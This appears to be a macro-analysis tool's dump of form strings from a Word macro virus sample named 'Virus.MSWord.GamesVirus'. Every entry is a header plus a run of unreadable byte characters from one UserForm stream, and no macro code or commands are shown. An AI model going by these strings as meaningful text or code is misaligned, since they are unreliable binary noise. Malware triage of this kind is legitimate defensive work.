9I)Ja2Rq;Zy<cy3Zy2Rq)Ji)Ji)Ji*Rq;Zy3Zy*Ri1Ji)Ja)Ji)Ji Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y)Ji1Ji(Ba)Ja2Rq3Zy=k�=ky3Zq*Ri)Ji2Rq2Rq2Rq2Rq*Ri*Ri)Ji Ba Ba BY'9Q BY BY Ba)Ji)Ji2Rq2Rq*Rq*Ri Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji3Zy*Rq)Ji Ba(Ba)Ja)Ja)Ji(Ba BY(BY BY BY(Ba'9Q'9Q'9Q'9Q(Ba)Ja)Ja3Zy BY BY)Ja)Ja2Rq3Zq*Ri BY BY)Ja*Ri)Ja)Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Ba Ba)Ja2Ri*Ra2Ri)Ji)Ja*Ri)Ji)Ja)Ji)Ji)Ji)Ji)Ja1Ji1Ji*Ri2Rq*Ri)Ji2Rq*Rq*Rq)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I&1Q'9Q(Ba(Ba*Ri2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Rq)Ji2Rq2Rq2Rq)Ji(Ba'9Q)Ja<c�<c�2Rq)Ja BY2Rq)Ji)Ji2Ri)Ja)Ji1Jq2Ri;Zy2Rq)Ji)Ja)Ja)Ji(Ba'9Q2Ri)Ja Ba)Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(BY'9Q2Rq)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q BY)Ja2Rq2Rq)Ja(Ba'9Y(BY)Ja3Zq2Rq)Ji(Ba)Ja BY'9Q'9Q2RiDc�<c�3Zy;Zy3Zy2Rq1Ji)Ja)Ji2Rq1Ji2Rq2Rq)Ji3Zy<c�<c�2Rq)Ji)Ji)Ji2Ri;Zy2Rq2Ri2Ri)Ji)Ji2Rq2Ri2Rq2Rq2RqDc�2Rq)Ji)Ji*Rq*Ri Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji2Rq*Ri1Jq)Ji*Ri2Rq2Rq2Rq2Rq)Ji2Ri*Ri*Ri2Ri)Ja)Ji(Ba BY BY(Ba)Ja)Ji*Rq)Ji(BY)Ja3Zy;Zy*Ri)Ji BY'9Q3ZqFs�<c�;Zq2Rq3Zy;Zy2Rq2Ri)Ja)Ja)Ji(Ba1Ji2Rq*Ri)Ji)Ja)Ji2Ry3Zy3Zy<c�<c�<c�3Zy*Rq2Rq*Ri)Ji)Ji)Ja)Ji)Ji(BY(Ba(Ba BY(Ba(Ba)Ja2Rq2Ri2Ry2Rq)Ja2Ri<cy=k�<c�3Zy2Ri)Ja)Ja2Rq)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY(Ba)Ja1Ji)Ji2Ri2Ri2Rq;Zy2Rq*Ri1Ji)Ji)Ji2Rq2Rq2Rq2Rq1Ji2Rq)Ji)Ja(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Y(BY(BY'9Q BY)Ji)Ja Ba(Ba'9Y/9Y(Ba)Ji1Ji)Ji)Ji2Rq2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 BY BY3Zq*Ri*Rq1Ji BY)Ja)Ja Ba2Rq2Rq2Rq1Ji BY)Ji1Ji BY BY2Rq*Ri)Ji!Ja)Ji;Zy BY(Ba(Ba)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY*Ri)Ji)Ja BY(BY'9Y2Rq*Ri=k�<c�*Ri*Rq3Zq*Ri)Ja(BY BY)Ja)Ja)Ji3Zq4cy*Ri BY BY)Ja)Ji)Ja*Ri2Rq3Zq<c�<c�2Rq)Ji'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ji2Rq)Ja)Ja2Rq3Zq2Rq2Rq Ba'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY2Ri2Rq2Ri)Ja2Rq2Rq*Ri2Ri!Ja BY Ba)Ji(Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba)Ji)Ji1Ji)Ja)Ja)Ji*Ri2Rq2Rq*Ri2Rq*Ri*Rq2Rq*Ri)Ja)Ja BY(Ba)Ja)Ja3Zy3Zy3Zq2Rq'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q BY2Rq3Zy4c�<c�<c�<cy3Zq)Ja(Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I1Ji<cy;Zy;Zy2Ri(Ba BY Ba)Ji)Ja)Ji)Ji(Ba)Ji1Ji2RqDc�<c�2Rq1Ji)Ja(Ba)Ja)Ja)Ji1Ji2Rq<c�2Rq)Ji1Ji*Ri*Rq2Rq3Zy<c�<c�3Zq2Rq3Zy4c�;Zy)Ji2Rq;Zy2Rq&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0'9I1Ji)Ji*Ri)Ji)Ja)Ja)Ja(Ba)Ja BY BY(BY)Ji2Rq)Ji BY BY(Ba(BY)Ji)Ji*Ri3Zy)Ji)Ji)Ji)Ji)Ja BY(Ba)Ji)Ji2Rq2Rq)Ji1Ji2Rq*Rq2Rq)Ji)Ji2Rq)Ji)Ji)Ji)Ji2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<c�Ek�<c�)Ji)Ji;Zy*Rq)Ji(Ba)Ja)Ji)Ji)Ji)Jq)Ji)Ji)Ji)Ja)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BY)Ji)Ji'9Y BY3Zy)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji)Ji)Ja2Ri3Zq3Zq3Zy)Ji2Rq(Ba2Rq)Ji3Zq2Rq2Rq*Ri2Rq2Rq*Ri*Rq)Ji Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ja2Rq;Zy<c�<c�3Zy3Zy)Ji BY'9Q BY)Ja)Ji)Ji)Ji)Ji)Ja)Ja BY BY)Ja)Ji)Ja(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q BY*RiDc�<c�Dc�3Zy)Ja2Rq<cy3Zq)Ja)Ja2Rq;Zy!Ja Ba Ba BY'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y(Ba BY BY(Ba(Ba)Ji2Rq*Ri)Ji Ba BY(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q'9Q)Ja*Ri*Ri3Zy*Rq*Rq2Rq2Rq2Rq)Ji Ba(BY BY Ba)Ji)Ja)Ja(Ba BY)Ji3Zy<cyDc�3Zy2Rq2Rq2Rq2Ri(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(Ba)Ja)Ja)Ja BY'9Y)Ja*Ri2Rq2Rq)Ja(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba2Rq2Rq3Zq2Rq)Ji*Ri2Rq*Ri)Ji2Rq3Zq3Zy2Rq)Ja Ba'9Y BY)Ji*Ri2Rq2Rq*Ri2Rq3Zq*Ri)Ja(Ba)Ja2Rq<c�<c�2Rq Ba(Ba Ba BY)Ja BY(Ba2Ri<c�;Zy2Rq)Ja)Ja)Ja)Ji*Rq Ba BY Ba BY)Ji2Rq3Zq<cy;Zy<cy3Zy*Rq*Rq)Ji(Ba)Ja)Ja)Ja2Rq2Rq3Zy2Rq Ba(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Rq;Zy<c�Fs�Dc�2Rq2Rq2Rq2Rq BY BY2Rq2Rq*Ri2Rq)Ji)Ja(Ba)Ji)Ja1Ji BY(Ba(Ba(Ba1Ji(Ba)Ji;Zy=k�2Rq1Ji(Ba;Zy<c�1Ji)Ja)Ja1Ji2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q;Zy)Ja)Ja2Ri3Zq3Zy2Rq)Ji(Ba'9Y BY1Jq2Ry<c�Ek�<c�<c�<c�*Ri BY'9Y BY)Ji*Ri*Ri)Ji Ba Ba)Ja(Ba(Ba(Ba'9Q(Ba(Ba(Ba BY BY(BY(Ba(Ba Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q BY BY)Ja(Ba)Ji2Rq2Rq1Ji(Ba Ba(Ba(Ba)Ja)Ja BY(Ba(Ba(Ba)Ji)Ji*Ri2Rq3Zy2Ry2Rq(Ba)Ji(Ba(Ba(Bi(Ba)Ja(Ba BY(Ba)Ji)Ji3Zy*Ri)Ja)Ja(BY)Ja)Ji!Ja'9Y BY)Ji;Zy3Zy3Zy<cy4cyEk�Ek�2Rq BY'9Q'9Q1Ji;Zy;Zy2Rq)Ji)Ji)Ji)Ji2Rq)Ji)Ja(Ba'9Y(Ba(Ba)Ja1Ji)Ja)Ja2Rq3Zy;Zy<c�*Ri BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y*Ri(BY BY BY2Rq2Rq2Ri2Rq3Zq3Zy)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y(BY(Ba1Ji2Ry<c�1Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q1Ji)Ja BY(BY)Ji3Zy;Zy<c�<c�3Zy3Zy3Zy)Ji Ba(Ba BY2Ri3Zy2Rq2Ri*Ri2Ri2Rq<cy<c�2Rq)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ja(BY(Ba(Ba BY)Ji*Ri)Ji)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Rq3Zq=k�<cy;ZyDc�<cy;Zy;Zy*Rq*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY)Ji*Ri(BY)Ja BY BY'9Q BY BY BY BQ'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(Ba2Rq2Ri1Ji3Zy3Zy;Z� Ba*Ri)Ji)Ja BY'9Y)Ji*Rq4c�3Zq(Ba BY)Ji2Rq<cy2Rq)Ji)Ji*Rq*Ri*Ri2Rq)Ji2Rq2Rq*Ri1Ji)Ja BY)Ja)Ji)Ji)Ji)Ji2Rq2Rq)Ji)Ja(BY BY BY BY(Ba(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q BY)Ja2Ri)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q(BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BY BY BY BY BY)Ji)Ji)Ji)Ji BY(Ba)Ji)Ja)Ja(Ba'9Q BY)Ja)Ja*Rq)Ja BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I&1I'9Y Ba(Ba BY BQ BY BY BY)Ji*Rq)Ja BY BQ BY BY BY(Ba!Ja3Zq<c�3Zy1Ji1Ji*Ri2Rq)Ji*Ri3Zy3Zq3Zy2Rq)Ji)Ja BY Ba3Zy4c�2Rq)Ji*Ri2Rq2Rq)Ji)Ji)Ja(Ba(Ba)Ja*Ri)Ji Ba2Rq3Zq3Zq2Rq)Ja BY'9Q'9Q)Ji'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY)Ja*Ri2Rq)Ja(BY'9Y'9Q2Ri*Ri)Ji)Ji(Ba BY'9Q'9Q2RqDc�3Zy3Zy3Zq3Zy2Rq(Ba)Ji2Rq)Ji2Rq2Rq)Ji2Rq4c�3Zy2Rq)Ji)Ji2Ri2Rq3Zq*Ri*Ri*Ri*Ri2Rq2Rq)Ji2Rq;Zy<cy2Rq)Ja)Ji2Rq BY'9Y(Ba*Ri2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Rq2Rq2Rq3Zy;Zy<cy;Zq;Zy<c�;Zy2Rq2Rq1Ji)Ji1Ji)Ji(Ba(Ba)Ji)Ja(Bi BY)Ja(Ba BY)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q)Ja*Ri2Ri(BY BY3Zy2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja Ba Ba(Ba(BY(Ba)Ja(Ba)Ji)Ji*Rq2Rq)Ji1Jq1Ji)Ja(Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y BY Ba)Ji BY BY(Ba)Ja'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q)Ja)Ja1Ji2Rq1Ji2Rq;Zy2Rq1Ji(Ba BY(BY'9Q(BY(Ba)Ja2Rq)Ji(Ba(Ba'9Y'9Q BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ji2Rq3Zy3Zy;Zy2Rq)Ja)Ja(Ba(Ba(Ba BY(BY(BY)Ja)Ji Ba(BY'9Y'9Q(Bi)Ji)Ji1Ji Ba(Ba(Ba)Ji3Zy;Zy)Ji(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I'9Y)Ja2Rq;Zy2Rq2Rq*Ri)Ji)Ji(Ba)Ja)Ji)Ji2Rq2Rq)Ji)Ji(Ba)Ja2Rq2Rq<c�Dc�<c�2Rq(Ba)Ja2Rq2Rq2Rq2Rq(Ba(Ba(BY BY)Ja)Ja)Ji)Ji)Ja2Rq2Rq)Ji1Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q<c�2Rq3Zq;Zy*Ri(Ba(Ba Ba)Ji*Ri2Rq3Zy*Ri(BY(BY)Ja)Ji)Ji)Ji;Zq;Zy;Zy;Z�)Ji(Ba BY BY*Rq*Ri)Ja1Ji2Rq3Zy2Rq(Ba'9Y&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Y2Ri;Zy2Rq)Ji3Zq3Zq*Ri)Ji Ba BY)Ji)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY1Ji1Jq1Ji)Ji)Ji)Ji2Rq*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Ja)Ja3Zq<cy<c�;Zy2Rq2Rq)Ji Ba3Zy2Rq)Ji2Rq)Ja3Zy3Zy*Rq)Jq(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ja)Ji)Ji2Rq BY<c�!Ja BY(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q3Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Q(BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q1Ji1Ji)Ji3Zq3Zq2Rq2Rq)Ji)Ja(BY'9Q(Ba(Ba BY Ba'9Q'9Q2Ri2Rq)Ji)Ji)Ji2Rq2Rq)Ji)Ji(Ba(Ba(Ba Ba(Ba(Ba(BY)Ji)Ji)Ji)Ji BY BY)Ja!Ja*Ri2Ri)Ji)Ji(Ba BY(BY)Ja;Zy;Zy)Ji(Ba'9Q'9Q(BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY)Ja*Ri*Ri)Ja(Ba)Ji)Ji2Rq2Rq*Ri2Rq)Ji Ba(Ba Ba Ba(Ba BY)Ja1Ji;Zy<cy*Rq*Ri)Ji*Ri;Zy;Zy3Zq;Zy3Zy2Rq2Rq)Ja BY)Ja)Ji)Ji)Ja)Ja2Rq!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y Ba(Ba(Ba2RqDc�;Zy)Ja)Ji*Ri)Ja)Ja)Ja1Ji1Ji)Ji2Rq*Rq)Ja'9Y Ba)Ji;Zy)Ji2Rq2Rq*Ri2Rq*Rq*Rq Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(Ba1Ji2Rq<cy;Zy<cy3Zy*Ri Ba'9Q BY(Ba)Ja)Ji)Ji)Ji)Ja(Ba BY)Ja)Ja)Ji(Ba'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY2Ri<cyDc�<cy2Rq)Ji3Zq<c�)Ja'9Q2Rq3Zy*Ri!Ja BY'9Y'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba Ba BY BY Ba)Ji*Rq*Rq)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Ba BY)Ja(Ba)Ja)Ji*Ri2Rq2Rq*Rq2Rq)Ja(BY2Ri2Rq;Zy3Zq*Ri Ba)Ja3Zq2Rq)Ji BY(BY)Ja1Ji2Rq<cy2Rq)Ji*Ri(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q*Ri)Ja BY(Ba)Ja BY BY BY'9Y Ba)Ja)Ja)Ji)Ji2Rq)Ji)Ji1Ji)Ji)Ja(BY BY(Ba)Ja)Ji)Ja BY BY(Ba)Ji2Rq)Ji)Ja2Rq2Rq*Ri1Ji)Ji)Ji2Rq)Ji)Ji)Ji)Ja)Ja)Ja)Ji2Ri)Ja(Ba(Ba'9Q)Ji2Rq*Ri)Ji(Ba BY)Ji)Ji1Ji2Rq(Ba(BY Ba Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ja(Ba(Ba Ba BY Ba)Ja)Ji3Zq;Zy2Rq)Ja BY)Ja)Ja)Ji1Ji)Ji)Ji)Ji2Rq<c�<c�2Rq2Rq*Ri*Ri2Rq*Ri2Rq2Rq2RqDcyEky<c�;Zy*Ri)Ja BY BY1Ji1Ji(BY)Ji3Zq3Zq3Zq*Rq2Rq(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y(BY)Ja)Jq)Ji)Ji)Ji)Ja1Ji2Rq(Ba(Ba Ba(Ba)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja3Zq;Zy2Rq)Ji)Ji*Ri*Rq2Ry3Zy;Zy;Zy3Zq3Zy Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ja)Ji2Rq!Ja BY(BY BY(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
